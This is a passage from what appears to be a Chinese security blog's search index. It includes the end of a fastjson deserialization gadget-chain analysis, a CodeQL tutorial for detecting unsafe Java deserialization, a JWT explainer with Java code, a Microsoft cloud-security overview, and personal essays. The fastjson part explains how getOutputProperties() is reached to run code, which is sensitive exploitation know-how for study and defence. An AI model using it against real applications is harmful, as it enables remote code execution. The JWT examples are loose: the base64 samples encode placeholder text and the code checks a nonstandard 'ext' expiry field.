&#125;\n\n\n\n上边跟踪了下getDeserializer的实现\n\n接下来就是deserialze了\n\n遍历javabeaninfo中处理返回的fieldList\n\n遍历的过程会对相应的field进行getDeserializer处理然后通过parseField进行反序列化\n\n跟进parseField看一下实现，它的作用应该就是实现“定制序列化”这个特性\n\n\nparseField里调用了smartMatch方法，这个漏洞很关键的一个点这也就是遍历到_outputProperties时执行getOutputProperties()的症结所在\n\n可以看到parseField调用了setValue\n\n跟进一下setValue可以看到method就是getOutputProperties()既然是这样，那么很明显的是要利用getOutputProperties()来执行恶意代码\n关于getOutputProperties()的执行链可以看上一篇分析https://blog.langu.xyz/%20FastJsonUnserialization.html\n\n\n0x03 构造POC和执行的根本原因上一篇基本已经提及了https://blog.langu.xyz/%20FastJsonUnserialization.html\n很精妙的一个漏洞，环环相扣\n这个gadget更是各种巧合，只要有任意一个点限制，就不能利用成功\n若json字符串中包含@type字段，会按照@type指定的类进行反序列化\n在修复版本中会默认忽略该字段，若数据中有@type字段，会抛出autoType is not support错误\n同时修复版本中允许通过配置白名单的形式来提供对特定类反序列化的支持\n1、调用链\n    1、为什么会走到这一步\n    2、关键方法是什么\n    3、特性是什么\n    4、继承自哪里\n\n2、最后是如何执行的\n    1、根本原因/本质是什么\n    \n3、如果是自己，该怎么挖出这个漏洞\n\n4、再构造一次poc\n    1、构造要点\n    2、所需条件\n\n参考：https://github.com/alibaba/fastjson/wiki/http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Uphttp://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"创造与热爱","url":"/%E5%88%9B%E9%80%A0%E5%92%8C%E7%83%AD%E7%88%B1/","content":"\n\n今天早上在朋友圈看到TIM的一个视频《一个百大UP主的创业故事》，颇有感触和共鸣，视频放在这里了。\n\n\n\n\n\n\n\n\n\n巧的是，早上来的路上，也看到这么一段话，不由得思考，“什么样的事情才可以称之为艺术？”\n\n这个之前也想过多次，看完TIM视频后，对于这个答案更加具象了一些，趁着还没有忘记，简单写几笔。\n私以为，工作虽不分高低贵贱，但却有着一个明显的分界线，那便是“这份工作/这件事情”是否会对“自我/某个领域/社会/全人类”带来一点“创新/创造/突破/进步”，还是仅仅为了迎合大众的口味亦或日复一日的重复。\n中午吃烤肉的时候，和5xxxx、bxxxx聊起来。\n——“你知道B站老番茄吗？全B站排名第三，他的作品的意义在哪里呢？”——“做游戏视频的那个？B站上绝大部分观众都是为了kill time，搞笑剪辑题材和性感舞蹈题材一样播放量不低。”\n&lt;画家和酿酒师&gt; &lt;黑客与画家&gt;，在内核上，大致是相通的，从没有路的地方寻出一条路来，如果只是一味的模仿/追随/重复，那大致就只能平庸过一生了，即使骗过了所有人，也没法骗过自己内心。\n（截图摘自某位偶像）\n当然了，一切的前提还是要先活下去，在生存的基础上去追求生存质量。\n另一个让我比较有共鸣的点是——“热爱”。有次和c—喝酒的时候，我说我现在也不知道自己热爱的是什么了，好像一切都是三分钟热度，碌碌无为。在过去的这几年里，几乎没有什么事情让我长时间进入心流状态了，彷佛做的一切只是为了谋生。\n周日在家中写了一下午的代码，无比沉浸，在看到预期输出的那一瞬，酣畅淋漓，彷佛多年之前彻夜不眠的自己又回来了。\n似乎自己喜欢的更多的是“创造”的过程，从0到1、从无到有，能够让自己进入心流模式，拍/剪视频的时候也会有这种感觉，一堆杂乱的素材通过各种转场、衔接，变成一个故事，类似的事情仔细想想竟也有不少，时间在此时已不是一个过程，而是一个状态。（难道是多巴胺的分泌？）\n\n\n\n\n有一个离职创业的朋友，每次在一起聚会的时候，听他讲起自己的事业、通宵coding的时候，似乎能从他眼中看到光。\n（题外话：一直以为眼里有光是个形容词，后来才知道，其实是一个生理反应，泪水的反光）\n\n我很羡慕，他能拥有自己的热爱、拥有逐梦的勇气。放弃薪水和稳定去与命运搏一线生机，即使失败又如何呢！\n\n\n（http://paulgraham.com/newideas.html）\n草草写下此文，大概只是说明了自己是个普通人吧。\n但是会永远这样吗？不知道。\n文末推荐一个优质的blog，《黑客与画家》的作者http://paulgraham.com/articles.html\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"利用CodeQL寻找Java Deserialization Vulnerabilities","url":"/%E5%88%A9%E7%94%A8CodeQL%E5%AF%BB%E6%89%BEJava%20Deserialization%20Vulnerabilities/","content":"Github发布CodeQL后，一直保持着关注，从17年就有类似的想法在尝试，在CodeQL中有很多不谋而合的点，查询语句刚上手虽然有些别扭，稍微适应了下感觉还好，值得好好学习一下\n\n接下来看一下如何发现Java Deserialization Vulnerabilities。\n攻击者在Java应用 deserialization时注入不可信数据进而可以执行任意代码。\njava.io.ObjectInputStream中的 readObject是个危险方法。常见的用法如下：\nObjectInputStream ois = new ObjectInputStream(input);MyObject obj = (MyObject)ois.readObject();\n\nreadObject方法的作用是从数据流中读取并返回该对象。那么我们都知道当构造序列化数据时插入恶意代码，则可以在 deserialization时产生非预期结果，甚至可以执行任意代码。\n使用CodeQL发现不安全的deserialization我们可以使用CodeQL来发现 deserialization漏洞，当然我们首先找到 deserialization进行的位置，然后需要跟踪不可信的数据是否可以到达 deserialization调用方法。\n首选我们编写一个查询语句去寻找 readObject调用。\nimport javafrom MethodAccess call, Method readobjectwhere  \tcall.getMethod() = readobject and  \treadobject.hasName(&quot;readObject&quot;) and  \treadobject.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;)select call\n\n这段codeql代码的意思是寻找名称为 readObject且类型为 java.io.ObjectInputStream的方法。\n上文这段代码会返回很多结果，其中大部分都是安全的。因此我们要定位到那些可读取脏数据的调用上。进行污点跟踪主要靠 RemoteFlowSource和 flowsTo。RemoteFlowSource的作用是发现可以由用户控制的输入点，例如http请求参数。谓词 flowsTo的作用是监控数据流是否从 source到达 sink。\n首先将查询重构为一个类，来定义我们感兴趣的 sink。也就是 readObject的调用集合，这里是脏数据流入的地方。\nclass UnsafeDeserializationSink extends Expr &#123;  \tUnsafeDeserializationSink() &#123;    \t\texists(MethodAccess call, Method readobject |     \tcall.getMethod() = readobject and             readobject.hasName(&quot;readObject&quot;) and              readobject.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;) and              this = call.getQualifier()    )          &#125;&#125;\n\n接下来我们定义 sink， source定义于 RemoteFlowSource，完整的查询语句如下。\nimport javaimport semmle.code.java.security.DataFlowclass UnsafeDeserializationSink extends Expr &#123;\tUnsafeDeserializationSink() &#123;    \t\texists(MethodAccess call, Method readobject |      \t\tcall.getMethod() = readobject and      \t\treadobject.hasName(&quot;readObject&quot;) and      \t\treadobject.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;) and         this = call.getQualifier()    )      &#125;&#125;from RemoteFlowSource source, UnsafeDeserializationSink sinkwhere source.flowsTo(sink)select source, sink\n\n当然，上边只查询了 java.io.ObjectInputStream.readObject这一个方法，其它反序列化框架也有类似的漏洞，例如Kryo、XmlDecoder、XStream、SnakeYaml等。\n完整的反序列化漏洞查询语句如下。\nimport javaimport semmle.code.java.dataflow.FlowSourcesimport semmle.code.java.security.UnsafeDeserializationimport DataFlow::PathGraphclass UnsafeDeserializationConfig extends TaintTracking::Configuration &#123;  \tUnsafeDeserializationConfig() &#123; this = &quot;UnsafeDeserializationConfig&quot; &#125;    override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;    override predicate isSink(DataFlow::Node sink) &#123; sink instanceof UnsafeDeserializationSink &#125;    &#125;from DataFlow::PathNode source, DataFlow::PathNode sink, UnsafeDeserializationConfig confwhere conf.hasFlowPath(source, sink)select sink.getNode().(UnsafeDeserializationSink).getMethodAccess(), source, sink,  &quot;Unsafe deserialization of $@.&quot;, source.getNode(), &quot;user input&quot;\n\n参考链接：https://lgtm.com/rules/1823453799/ https://securitylab.github.com/research/insecure-deserialization\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"基于token的认证","url":"/%E5%9F%BA%E4%BA%8Etoken%E7%9A%84%E8%AE%A4%E8%AF%81/","content":"0x01 cookie/session说到token就必然绕不开cookie和session。\ncookie：由服务端给客户端颁发的一张通行证，用来验证客户端的身份，本质上是一段在浏览器上以KV形式存储的文本数据，包含了session相关信息。用于解决HTTP协议无状态的问题，所以cookie是一个会话跟踪机制，是有状态的。    \n session：当客户端请求服务端通过验证后，服务端会生成保存身份认证相关的session数据，并将session相关信息写入cookie返回给客户端，然后客户端将cookie保存到本地。之后两端就通过核对session信息来确认可信状态。session 可能会存储在内存、磁盘、数据库里，可能需要在服务端定期的去清理过期的 session。\n0x02 token既然有了cookie/session为啥还需要token呢    \n优点：\n1、无状态、可扩展\n2、安全性\n3、可扩展性\n4、多平台跨域/单点登陆\n5、基于标准\n6、缓解服务器内存压力/增大服务器计算压力\n格式：\nUID + TIME + SIGN [+ OTHER]\n0x03 实施JSON Web Tokens（JWT）\n组成：\n\nheader\n\n用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等\n&#123;  &quot;typ&quot;: &quot;JWT&quot;,  &quot;alg&quot;: &quot;HS256&quot;&#125;\n\nbase64一下\newogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9\n\npayload\n\n标准文档：https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1\n可以在其中添加这些字段\niss：Issuer，发行者sub：Subject，主题aud：Audience，观众exp：Expiration time，过期时间nbf：Not beforeiat：Issued at，发行时间jti：JWT ID\n\nMap&lt;String , Object&gt; payload=new HashMap&lt;String, Object&gt;();Date date=new Date();payload.put(&quot;uid&quot;, &quot;007&quot;);payload.put(&quot;iat&quot;, date.getTime());payload.put(&quot;ext&quot;,date.getTime()+1000*60*60);\n\n上边代码中添加的字段如下\n&#123;    &quot;iat&quot;: 当前时间,    &quot;exp&quot;: 过期时间,    &quot;uid&quot;: &quot;007&quot;&#125;\n\nbase64编码\newogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==\n这样payload就生成好了\n\nsignature\n\n将header和payload生成的base64编码通过.连接起来，如下\newogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==\n然后再定义一个secret，如下\nsecret\n通过header中定义的HS256算法以secret为密钥进行加密得到signature\n81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb\n此时JWT就生成了，base64(header).base64(payload) .signature\n像这样ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==.81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb\n当然这种方式不能在token中携带敏感信息，例如密码\n0x04 应用\n单点登陆\n\nSet-Cookie: jwt=yyy.zzz.xxx; HttpOnly; max-age=980000; domain=.taobao.com \n\nAPI 调用/授权\n\nhttps://api.weixin.qq.com/cgi-bin/component/api_query_auth?component_access_token=xxxx\n\n支付验证（一次性）\n\n串行服务调用\n  一次性有效，再次生成token时以用户账户和第一次token为key，update该记录来判断\n\n敏感接口多次调用\n\n\n0x05 代码生成代码\nprivate static final JWSHeader header=new JWSHeader(JWSAlgorithm.HS256, JOSEObjectType.JWT, null, null, null, null, null, null, null, null, null, null, null);    \t/**\t * 生成token，该方法只在用户登录成功后调用\t * \t * @param Map集合，可以存储用户id，token生成时间，token过期时间等自定义字段\t * @return token字符串,若失败则返回null\t */\tpublic static String createToken(Map&lt;String, Object&gt; payload) &#123;\t\tString tokenString=null;\t\t// 创建一个 JWS object\t\tJWSObject jwsObject = new JWSObject(header, new Payload(new JSONObject(payload)));\t\ttry &#123;\t\t\t// 将jwsObject 进行HMAC签名\t\t\tjwsObject.sign(new MACSigner(SECRET));\t\t\ttokenString=jwsObject.serialize();\t\t&#125; catch (JOSEException e) &#123;\t\t\tSystem.err.println(&quot;签名失败:&quot; + e.getMessage());\t\t\te.printStackTrace();\t\t&#125;\t\treturn tokenString;\t&#125;\n\n校验代码\npublic static Map&lt;String, Object&gt; validToken(String token) &#123;\t\tMap&lt;String, Object&gt; resultMap = new HashMap&lt;String, Object&gt;();\t\ttry &#123;\t\t\tJWSObject jwsObject = JWSObject.parse(token);\t\t\tPayload payload = jwsObject.getPayload();\t\t\tJWSVerifier verifier = new MACVerifier(SECRET);\t\t\tif (jwsObject.verify(verifier)) &#123;\t\t\t\tJSONObject jsonOBj = payload.toJSONObject();\t\t\t\t// token校验成功（此时没有校验是否过期）\t\t\t\tresultMap.put(&quot;state&quot;, TokenState.VALID.toString());\t\t\t\t// 若payload包含ext字段，则校验是否过期\t\t\t\tif (jsonOBj.containsKey(&quot;ext&quot;)) &#123;\t\t\t\t\tlong extTime = Long.valueOf(jsonOBj.get(&quot;ext&quot;).toString());\t\t\t\t\tlong curTime = new Date().getTime();\t\t\t\t\t// 过期了\t\t\t\t\tif (curTime &gt; extTime) &#123;\t\t\t\t\t\tresultMap.clear();\t\t\t\t\t\tresultMap.put(&quot;state&quot;, TokenState.EXPIRED.toString());\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t\tresultMap.put(&quot;data&quot;, jsonOBj);\t\t\t&#125; else &#123;\t\t\t\t// 校验失败\t\t\t\tresultMap.put(&quot;state&quot;, TokenState.INVALID.toString());\t\t\t&#125;\t\t&#125; catch (Exception e) &#123;\t\t\t//e.printStackTrace();\t\t\t// token格式不合法导致的异常\t\t\tresultMap.clear();\t\t\tresultMap.put(&quot;state&quot;, TokenState.INVALID.toString());\t\t&#125;\t\treturn resultMap;\t&#125;\t\n\n\n\n参考：http://blog.leapoahead.com/2015/09/06/understanding-jwt/https://github.com/bigmeow/JWT\n","categories":["安全开发"],"tags":["DEV"]},{"title":"多云跨平台技术","url":"/%E5%A4%9A%E4%BA%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%8A%80%E6%9C%AF/","content":"当今大多数组织都在运行一个复杂的环境，其中包括众多操作系统平台、SaaS 云服务和 IaaS/PaaS 云提供商。 根据您的行业，这通常还包括各种操作技术（也称为 SCADA、ICS 或 PCN）和物联网设备\n多云跨平台技术Microsoft 专注于通过利用我们每天从超过 8 万亿个情报中收集的洞察力，为组织提供降低这些现代资产风险所需的安全功能，帮助组织改进其安全计划的各个领域。\nMicrosoft 还专注于从我们的全球客户和合作伙伴网络（包括解决方案集成和 MDR/MSSP 合作伙伴）、NIST、CIS 和 The Open Group 等组织、CERTS、ISAC、执法机构（用于僵尸网络清除）中引入安全专业知识和情报等等。\n\n补充说明：OT 和物联网——大多数组织通过其中一种或两种方式暴露于物联网和OT 安全风险：\n•     常见的系统，如 HVAC 系统、安全摄像头和大多数组织中的数据中心；\n•     用于制造、发电/配电、医疗保健或其他支持实体业务运营的设备/传感器的专用网络设备。\n如何使多云跨平台安全\n终端和云管理Microsoft 的跨平台/云安全性始于端点和云可见性和控制：\n•     跨 Mac、Android、iOS 和 Windows 操作系统的终端管理；\n•    云安全态势管理 (CSPM)，可提供对多云和本地数据中心资产的洞察力以及云工作负载保护功能（又名 CWPP）。\n\nSIEM 和 XDR 策略Microsoft 为安全运营/SOC 提供集成功能，以获得跨云和平台快速检测、寻找和响应/恢复威胁所需的广泛和深入的可见性：\n•Broad – 安全信息和事件管理 (SIEM) – Microsoft Sentinel 从任何来源获取任何日志，将它们与机器学习 (ML) 和用户和实体行为分析 (UEBA) 相关联并解释它们的原因，并通过安全编排自动响应 , 自动化和响应 (SOAR)；\n•Deep - 扩展检测和响应 (XDR) – 功能提供针对特定资产量身定制的检测和响应功能，以提供高质量警报（低误报率），从而减轻 SOC 分析师编写警报查询和处理端点误报的负担 、云和本地标识、电子邮件、Office 365、Azure 服务等等。\n\n基础设施 XDR•Microsoft Defender for Cloud 是 Azure 服务的 XDR，包括服务器/VM、应用服务、存储、SQL、Kubernetes、容器注册表、DNS 等；\n•Azure Arc 通过将这些资源投射到 Azure 对象中，将 Microsoft Defender for Cloud 扩展到 AWS、GCP 和本地资源，从而实现这些资源的管理和安全性；\n•Microsoft Defender for IoT（和 OT）为 SCADA、ICS 和工业物联网 (IIoT) 等运营技术 (OT) 设备提供威胁检测和响应功能\n•这可以在离线模式下运行以进行安全隔离，也可以在在线模式下运行，在该模式下它与 Microsoft Sentinel 中的 playbook 等本地集成。\n\n\n工作效率和身份安全 XDRMicrosoft 365 Defender 提供了一个广泛的库，其中包含预构建的调查和响应自动化 (SOAR) 功能、数据丢失保护 (DLP) 功能、Web 内容筛选、集成威胁和漏洞管理等。\n\n身份启用和安全性Azure Active Directory 为以下方面提供全面的解决方案：\n•    身份支持——适用于跨任何平台或云的员工、合作伙伴 (B2B) 和客户/客户/公民 (B2C)；\n•     身份安全——适用于那些具有零信任访问控制的场景，通过本机 UEBA、威胁情报和分析明确验证设备（通过 XDR）和用户的可信度。\n\n信息保护Microsoft 信息保护和 Azure Purview 提供了一个完整的生命周期方法来发现、分类、保护和监视结构化和非结构化数据，使组织利用更多数据和见解来推动任务完成和竞争优势。\n\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"奔涌的后浪与独立思考","url":"/%E5%A5%94%E6%B6%8C%E7%9A%84%E5%90%8E%E6%B5%AA%E4%B8%8E%E7%8B%AC%E7%AB%8B%E6%80%9D%E8%80%83/","content":"从小你们就在自由探索自己的兴趣；很多人在童年就进入了不惑之年，不惑于自己喜欢什么，不喜欢什么。\n昨天《后浪》刷屏了朋友圈，笔者也转发了，被何冰老师富有感染力的声音和部分走心的文案戳中\n自由学习一门语言，学习一门手艺，欣赏一部电影，去遥远的地方旅行。从小你们就在自由探索自己的兴趣；很多人在童年就进入了不惑之年，不惑于自己喜欢什么，不喜欢什么。\n\n不过在看过之后回想，笔者认为这只是我们生活的一个剪影，并不能代表我们这一代人。这里不讨论宣传片里的UP主们，在上一篇中有提到，这是我们该去拥抱的新事物。\n今天是青年节，不同于中秋节、端午节、情人节，这是一个精神的节日。\n我们要的不应该只是小说、电影、音乐，而是不盲从不偏执.\n建立自己完整的世界观、价值观，拥有判断、批判和独立思考的能力.\n互联网的时代，给我们这代人带来了无数的便利和机会，同时快餐式的文化也随之而来，让时间成为一个奢侈品，思考也变得弥足珍贵。\n所以就更应该对那些观点、事物、现象多问一句，这就是真相吗？这就是对的吗？在如今官本位、金本位的大势之下。\n独立思考的同时更重要的是正确思考、不偏执、不杠精，因为大多数情况下往往那就是对的，但是这种能力却是需要时时刻刻保持在生活中。\n很多人认为独立思考就是多读书，笔者却不这么认为，读书的作用更多的是让我们去了解别人的想法，从而更客观的去认识这个世界，但是思想不同于苹果，别人的思考终归是别人的，只有经过吸收、碰撞、质疑后的才会成为我们自己的，这也是我们每个人世界观构建途径的一部分（当然也可能会被不断的颠覆，不断的重构），读书更关键的在于去思考。\n希望我们这代年轻人，不再以屁民、韭菜、社畜自居，而是试着去改变去突破，无所畏惧方有无限可能。\n奔涌吧，后浪\n\n2020.5.4 写给笔者自己\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"如何通过随笔来更好的思考","url":"/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E9%9A%8F%E7%AC%94%E6%9D%A5%E6%9B%B4%E5%A5%BD%E7%9A%84%E6%80%9D%E8%80%83/","content":"每天都在接收大量的信息，工作、新闻、八卦、鸡汤、生活小知识、梦、生活片段、心情变化、奇思妙想…….\n但是这些信息，就像水一样，流过之后，仿佛什么都没有留下\n可能尝试过无数次记录，可能尝试过完美的分类，但是会发现将记录放在哪个分类里本身就是一件困难的事情；也可能尝试过什么分类都不做，然后一切变得乱糟糟，再也不想去打开历史的记录\n因为绝大多数的信息都是多维度的，没有清晰的界限，它可能既属于工作，也属于生活……\n一旦开始就把结构固定，那后续调整的成本会非常高，因为我们的知识、思考、心情等所构成的知识结构，就像是一棵树，是不断在生长的，所以我们可以先记录，打标签，让它慢慢生长，等积累一段时间后，结构自然就会“生长”出来。\n让系统能自然生长，随着认知变化而生长。而更关键的应该是，由问题驱动自己不断探索领域，然后通过不断地刻意练习，来在某个领域积累知识的复利。\n如何打标签？\n可以用I.A.R.P标签记录法的思路（适当的参考，用最顺手的方式，这样才不会有任何的阻力）\n•        Inbox（收件箱）：我会将所有临时性的，还未消化的内容放置于此，定期来进行归档、整理或者删除。可以当做大脑的缓存，避免记录的时候纠结放在哪里。\n•        Area（领域）：这是最重要的概念，即日常你需要精进的「领域」，比如健康就是一个领域，而跑步则是项目；写作是一个领域，而写一篇公众号文章则是一个项目；    即你最关注的领域是什么。我们的一生中由许多事件构成。    只是对于大多数人来说，他们其实并没有一个关于自己生活和工作的完整的项目清单。但是他们却会告诉你，有太多的事情要做。当这样忙忙碌碌多年以后，其实发现自己可能做了许多事，但是却「样样稀松」。\n•        Resource（资源）：对应到卢曼的 Zettelkasten 方法中，更像是永久笔记。一般来说是兴趣、主题、资产等内容。注意是自己消化过的内容，而非机械的收藏。\n•        Project（项目）：是指一个将要发生的独立事件，并且这个事件不是一次性就能完成的，至少需要多个动作才能完成。比如要写一本书，需要整理资料，罗列提纲，撰写内容，联系出版社。类似生活中还有组织一次旅游，录制一期播客等。\n记录什么？\n生活中有趣的事情、幸福感的瞬间、突然的感悟、不安的情绪等等：\n每一天，我们都丢失东西，在向前走的路上。将它们记录下来。\n记忆这东西是一种相当不可靠的物质，它就像一扇破败的窗户，落满灰尘，玻璃模糊不清，与窗框之间充满裂缝，稍微一碰，就可能稀碎一地。平时呢，伪装的又很好，像一大把棉花糖，看起来蓬松绵软，五颜六色，糖丝在阳光下还泛着莹光，但你一口咬下去，都是吃了个寂寞。\n\n记录读书笔记：\n一如《卡片笔记写作法》中所言，在记读书笔记的时候，尽量避免划线摘录，而是要用自己的话写出来，给自己看。不必担心词句的华丽与否，不必担心是否有所遗漏，这个过程就像是照镜子一样，应该关注的是自己的大脑对于内容的反射，这才是你思考的精华，而不是照搬书中的内容。\n\n对情绪进行复盘（冥想）：\n在一件又一件日常琐事间疲于奔命时，人很容易遗失自我，丢弃初心。\n\n花一点时间记录心中所想，可以帮助你暂缓脚步，找回重心，重新连接内在自我。\n\n我们如此忙于填满所有的时间，以至于对于什么是平静和安定心灵，我们早已没了参照点。我们对“做事”上了瘾，甚至对“思考”都上了瘾。因此，刚开始平心静气地坐下来，会让我们觉得有点儿陌生。 —— 《十分钟冥想》\n\n其实我们并非是一个不断积累的个体，而是由一个个瞬间组成。当遇到一些事情的时候，我们并非所有的历史回忆和情绪会到场，而是那些最强烈的、印象最深的会提前抵达。如果没有这样的记录和反思，那么往往会被短期情绪所左右，而丧失了长期思考的能力。\n\n培养写作的能力：\n即使是最优秀的写作者，其实不断在练习的也是记录和写出自己灵感的能力。 \n\n一直觉得，每个人都可以成为好的写作者，都会有很多的灵感，区别只在于，你有没有把你的这些灵感记录下来。\n\n任何的所思所想：\n当自己有所思所想的时候，也建议记录在里面。\n一般有四个基本情绪：\n1）喜：快乐，开心，兴奋\n2）怒：生气，恼火，愤怒\n3）悲：难过，伤心，悲伤\n4）惧：担心，害怕，恐惧\n不要评判，这就是正念， 看见，不评判。只是记下来，记多了之后，改变可能就悄悄的发生了。\n\n我是如何记录的：\n好的工具flomo是非常好的，不过我更喜欢原生、多平台，可以随时打开的，所以会用备忘录的标签，基本已经养成习惯了(最新的系统更新加入了不同备忘录间的引用)\n\n有时候心情不好的时候，就慢慢翻之前的片段，能获得很多能量，这大概是这个东西带给我最大的收获\n\n记于2022.2.24\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"妄谈：“技术安全运营”的未来是“安全架构师”","url":"/%E5%A6%84%E8%B0%88%EF%BC%9A%E2%80%9C%E6%8A%80%E6%9C%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E2%80%9D%E7%9A%84%E6%9C%AA%E6%9D%A5%E6%98%AF%E2%80%9C%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E5%B8%88%E2%80%9D/","content":"\n\n资历尚浅，见识狭隘，仅以自身所见所闻所学，妄谈一下这个话题，当个乐子，随便看看。\n\n\n问：“架构师”是岗位还是思想？：在阿里对架构师的定义是“去应对复杂性，应对熵值不断增加的一个组织性的力量。”“软件/系统架构的核心挑战是快速增长的复杂性，越是大型系统，越需要简单性。”识别和控制复杂度正式“架构师”在对复杂核心系统设计时候要考虑的重点。\n而架构的基本出发点是效率，通过合理的架构设计、有序化重构，实现效率最大化。\n架构师不应该脱离业务上下文而单独存在，好的架构师是为解决复杂问题而存在的，思考如何能用抽象的方法解决一类问题。将发现的问题进行抽象和归纳，定义问题的基本要素，定义出问题的短期和长期解决方案，推动技术整体的进步。\n简化一下架构师本质上是一种“发现问题—定义问题—解决问题”的能力或是思考模式，而如何定义问题是“架构师”是否优秀的核心衡量。\n问：“架构师”需要具备哪些能力？：“架构师”要具备的五个能力，1. 全局视角 2. 技术广度 3. 持续学习 4. 业务理解 5.结果落地。\n不同level的架构师的差别在于建设的范围，例如在阿里体系内，技术序列从P8开始就要具备架构师的能力，P8往往只负责一个单体业务，P9会负责一个更加复杂的单体业务，到了P10就要思考整个行业，而P11及以上就要跨行业、从集团整体角度去思考问题，最牛的架构师莫过于“1979年，那是一个春天，有一位老人，在中国的南海边，划了一个圈……”\n但是我更认可的是“架构师”是一个底层的人才特质，与层级无关。（实际上有大把P8并没有任何的“架构师”思维）\n问：“架构师”需要非常精深的技术能力吗？：如果身兼“架构师”的角色，往往就没有足够的时间去持续的精深技术，但是这个角色本身需要大量的实践和知识的积累，需要接触更多的人和事，用新的方法来解决新的问题。要具备这个能力，就要持续的保持先进技术学习的能力和经常性的实践。\n问：“安全”“架构师”存在的意义是什么？：在上一篇文章中写了“技术安全运营”，那么在这之后的发展我浅薄的认为应该就是“安全架构师”了。\n参考架构师的Job Model，作为架构师，应该具备横向和纵向两方面的职责。\n一方面不能脱离实际的业务上下文，要深入到业务中，从业务战略到技术战略再到安全战略，到设计、实施、再到治理。提供一个简单、清晰、优秀的设计。在安全风险治理中什么是好的设计呢？默认安全和可持续化是最核心的两点。\n就像在实际的工作中，很多风险治理都是靠人力去运营，稍有成色便在PPT上侃侃而谈大书特书，但是实际上只要项目转为日常化运营，那便等于没人运营了。要想做到低成本的可持续风险治理何其难。\n再者是默认安全，在各类风险中，人的因素不可谓不大，一味的用各种方式要求“人”来保证安全，终归事倍功半。\n“安全架构师”在这其中，既要能设计出有效的阶段治理策略，又要保证这样的设计可以迭代可持续化。\n另一方面，“安全架构师”要融入到“系统架构师”圈子中，与他们就重要的概念达成一致。因为不存在哪个业务先设计好架构然后去发展的，大多都是野蛮生长然后再规范化。那在这个过程中，一个优秀的健壮的安全的架构需要“架构师”们一起对重要的概念、原则有广泛的共识，例如“默认安全”。\n“安全架构师”必须是一个长期主义者，要长期的去看一些东西。而要具备“长期主义”，是需要有信仰的，信仰何来，需要持续的对前沿的理念、技术进行学习，同时对身处其中的业务足够的了解，更重要的是要有一个可以培养“长期主义”的土壤（虽然现在的浮躁对于长期主义并不友好）。\n还有一个重要的点，不论是“架构”还是其它的比如“云安全”等，一定不要狭义的去理解，就比如“云安全”，不仅仅包括“K8S”，也包括“云系统网络的设计”、“云上应用的设计”、“云上数据安全保护”等等，“架构”也是同理，技术、产品、业务、经营等等都要交叉去思考，才能有一个更全局的视角和思考，“安全”真的是小的不能再小的一个赛道了，跨圈看看会发现有大量优秀的设计可以借鉴回来。\n看完这里，相信各位必然会有许多不同的见解，我也是正门外窥探，随便看看好了。\n","categories":["应用安全"],"tags":["THINK"]},{"title":"安全角色和职责","url":"/%E5%AE%89%E5%85%A8%E8%A7%92%E8%89%B2%E5%92%8C%E8%81%8C%E8%B4%A3/","content":"\n\n显示安全角色如何映射到业务成果支持\n\n\n传统上，业务和技术成果是使用计划/构建/运行框架来驱动的（对于数字化转型，随着所有阶段的快速迭代，该框架变得越来越敏捷）。\n安全结果是通过映射到该框架的类似治理、预防和响应框架驱动的。 这也映射到 NIST 网络安全框架的识别、保护、检测、响应和恢复功能。\n\nLeadership安全领导角色和安全架构师角色在整个组织和技术领域提供远见、指导和协调。\n\nGovernance安全态势和合规性角色专注于识别整个企业的安全风险，并与领域专家合作，以确保减轻最大风险。 这些角色的职责通常包括安全合规管理、政策和标准以及状态管理。\n\nPrevention平台安全工程师是安全领域专家 (SMEs)，他们专注于企业范围的系统，如身份和密钥管理，以及各种基础设施和端点学科，如网络安全、服务器/VM 安全和客户端端点/设备。\n应用安全工程师是专注于保护个人工作负载和应用程序的安全 SMEs，通常在它们被开发的时候。 这些职责包括基础架构和端点技能的每个工作负载应用程序以及应用程序安全性和 DevSecOps 和数据安全性。 我们预计，随着数字化转型增加云技术、DevOps/DevSecOps 模型和基础设施即代码方法的采用率，对这些技能的需求将继续增加。\n人员安全是一门新兴学科，其重点是教育人员、保护他们并保护组织免受内部风险的影响。\n\nResponse运营阶段由负责生产环境的运营团队（IT 和 OT 运营、DevOps）+ 